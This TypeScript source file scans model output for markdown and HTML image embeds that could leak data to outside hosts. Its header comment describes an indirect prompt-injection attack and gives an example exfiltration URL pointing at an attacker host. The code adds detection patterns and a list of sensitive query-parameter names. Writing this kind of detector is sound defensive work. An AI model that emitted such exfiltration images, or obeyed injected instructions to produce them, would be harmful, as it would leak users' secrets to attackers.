/**
 * Markdown & Covert Blind Image Exfiltration Detector.
 *
 * Catches indirect prompt injection vectors where malicious input tricks the model
 * into rendering markdown images or HTML embeds (e.g. `![alt](https://attacker.com/log?q=SECRET)`)
 * that cause the victim's client to make unsolicited HTTP requests leaking private data.
 */

export interface MarkdownExfiltrationFinding {
  rule: "EXF001";
  severity: "high" | "critical";
  url: string;
  hostname: string;
  suspiciousReason: string;
  snippet: string;
}

export interface MarkdownExfiltrationOptions {
  /** Optional set of trusted image hostnames to allow */
  allowedHostnames?: string[];
  /** Allow image embeds if they contain no query parameters or base64 blobs */
  allowCleanStaticAssets?: boolean;
}

const MARKDOWN_IMAGE_REGEX = /!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/gi;
const HTML_EMBED_REGEX = /<(?:img|link)\s+[^>]*?(?:src|href)=["'](https?:\/\/[^"']+)["'][^>]*>/gi;

const SENSITIVE_QUERY_PARAMS = new Set([
  "data",
  "leak",
  "token",
  "secret",
  "key",
  "api_key",
  "apikey",
  "password",
  "session",
  "auth",
  "payload",
  "q",
  "val",
  "user",
  "email",
]);

const BASE64_PATTERN = /[A-Za-z0-9+/=]{32,}/;

/**
 * Inspects a generated text output for covert markdown or HTML exfiltration attempts.
 */
export function detectMarkdownExfiltration(
  text: string,
  options: MarkdownExfiltrationOptions = {},
): MarkdownExfiltrationFinding[] {
  const findings: MarkdownExfiltrationFinding[] = [];
  const allowed = new Set(
    (options.allowedHostnames ?? []).map((h) => h.toLowerCase().trim()),
  );
  const allowClean = options.allowCleanStaticAssets ?? true;

  function evaluateUrl(fullMatch: string, rawUrl: string) {
    try {
      const parsed = new URL(rawUrl);
      const hostname = parsed.hostname.toLowerCase();

      if (allowed.has(hostname)) {
        return;
      }

      let reason: string | undefined;
      let severity: "high" | "critical" = "high";

      // 1. Check for sensitive query parameter names
      for (const [key] of parsed.searchParams.entries()) {
        if (SENSITIVE_QUERY_PARAMS.has(key.toLowerCase())) {
          reason = `Query parameter "${key}" frequently used for exfiltration payloads.`;
          severity = "critical";
          break;
        }
      }

      // 2. Check for base64 encoded data inside query string or pathname
      if (!reason && BASE64_PATTERN.test(parsed.search + parsed.pathname)) {
        reason = "Contains suspected base64-encoded high-entropy data string.";
        severity = "critical";
      }

      // 3. If untrusted external image is embedded and query params exist
      if (!reason && parsed.search.length > 1) {
        reason = `Untrusted external image embed carrying dynamic query parameters (${parsed.search}).`;
      }

      // 4. If clean static assets are not explicitly permitted for untrusted hosts
      if (!reason && !allowClean) {
        reason = `Untrusted third-party image host "${hostname}" without domain authorization.`;
      }

      if (reason) {
        findings.push({
          rule: "EXF001",
          severity,
          url: rawUrl,
          hostname,
          suspiciousReason: reason,
          snippet: fullMatch.slice(0, 150),
        });
      }
    } catch {
      // Malformed URL, skip
    }
  }

  // Scan for Markdown images: ![alt](url)
  let match: RegExpExecArray | null;
  const mdRegex = new RegExp(MARKDOWN_IMAGE_REGEX.source, MARKDOWN_IMAGE_REGEX.flags);
  while ((match = mdRegex.exec(text)) !== null) {
    const url = match[2];
    if (url) {
      evaluateUrl(match[0], url);
    }
  }

  // Scan for HTML embeds: <img src="url"> or <link href="url">
  const htmlRegex = new RegExp(HTML_EMBED_REGEX.source, HTML_EMBED_REGEX.flags);
  while ((match = htmlRegex.exec(text)) !== null) {
    const url = match[1];
    if (url) {
      evaluateUrl(match[0], url);
    }
  }

  return findings;
}
